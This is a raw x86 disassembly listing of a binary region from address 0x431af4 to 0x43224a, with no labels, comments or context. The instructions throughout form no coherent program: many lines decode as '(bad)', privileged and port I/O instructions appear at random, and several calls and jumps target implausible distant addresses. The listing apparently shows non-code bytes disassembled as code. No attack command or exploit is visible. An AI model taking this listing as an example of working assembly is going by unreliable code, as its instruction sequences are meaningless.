  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
